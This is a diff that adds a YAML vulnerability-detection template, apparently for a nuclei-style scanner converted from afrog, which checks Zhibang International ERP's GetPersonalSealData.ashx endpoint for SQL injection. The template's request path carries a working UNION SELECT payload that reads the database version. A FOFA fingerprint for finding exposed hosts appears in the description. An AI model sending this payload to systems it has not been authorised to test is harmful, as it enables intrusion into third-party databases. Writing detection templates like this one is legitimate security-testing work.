@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - Microsoft SQL Server
+          - '"SealData":'
+          - '"Image":'
+        case-insensitive: true
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--'
+id: zbintel-erp-getpersonalsealdata-sqli
+info:
+  author: avic123
+  description: |
+    智邦国际ERP系统GetPersonalSealData.ashx接口处存在sql注入漏洞，攻击者可利用此漏洞获取数据库敏感信息。
+    FOFA：icon_hash="-682445886"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 智邦国际ERP-GetPersonalSealData.ashx存在SQL注入漏洞
+  severity: high
+  tags: zbintel,erp,sqli,argus-import
